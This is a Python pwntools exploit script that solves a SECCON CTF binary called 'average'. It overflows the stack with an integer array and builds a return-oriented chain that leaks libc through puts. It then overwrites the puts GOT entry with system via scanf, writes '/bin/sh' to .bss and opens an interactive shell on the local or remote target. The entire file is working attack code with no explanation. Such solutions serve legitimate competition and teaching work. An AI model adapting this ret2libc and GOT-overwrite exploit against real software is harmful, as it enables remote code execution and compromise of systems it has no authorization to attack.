#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./average', checksec=False)

if args.REMOTE:
	p = remote('average.quals.seccon.jp', 1234)
	libc = ELF('./libc.so.6', checksec=False)
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

rop = [
	pop_rdi,
	binary.got.puts,
	binary.plt.puts,
	binary.sym.main
]

payload  = []
payload += ((0xa8 - 0x28) // 8) * [0xAAAA]
payload += [(0xa8 // 8) + len(rop)]
payload += 2 * [0xBBBB]
payload += [len(payload)]
payload += ((0xa8 // 8) - len(payload)) * [0xCCCC]
payload += rop

for i in payload: assert(-123456789 <= i <= 123456789)

n = len(payload)
log.info('n: {n}'.format(n = n))

p.sendlineafter(b': ',str(n).encode())
for i in payload: p.sendlineafter(b': ',str(i).encode())
p.recvuntil(b'Average')
p.recvline()

_ = p.recv(6)
libc.address = u64(_ + b'\0\0') - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))

lld = binary.search(b'%lld').__next__()
pop_rsi_r15 = binary.search(asm('pop rsi; pop r15; ret')).__next__()

rop = [
	pop_rdi,
	lld,
	pop_rsi_r15,
	binary.got.puts,
	0xAAAA,
	binary.plt.__isoc99_scanf,
	pop_rdi,
	lld,
	pop_rsi_r15,
	binary.bss() + 0x100,
	0xBBBB,
	binary.plt.__isoc99_scanf,
	pop_rdi+1,
	pop_rdi,
	binary.bss() + 0x100,
	binary.plt.puts
]

payload  = []
payload += ((0xa8 - 0x28) // 8) * [0xAAAA]
payload += [(0xa8 // 8) + len(rop)]
payload += 2 * [0xBBBB]
payload += [len(payload)]
payload += ((0xa8 // 8) - len(payload)) * [0xCCCC]
payload += rop

for i in payload: assert(-123456789 <= i <= 123456789)

n = len(payload)
log.info('n: {n}'.format(n = n))

p.sendlineafter(b': ',str(n).encode())
for i in payload: p.sendlineafter(b': ',str(i).encode())
p.recvuntil(b'Average')
p.recvline()

p.sendline(str(libc.sym.system).encode())
p.sendline(str(int('0x' + hexlify(b'/bin/sh'[::-1]).decode(),16)).encode())
p.interactive()

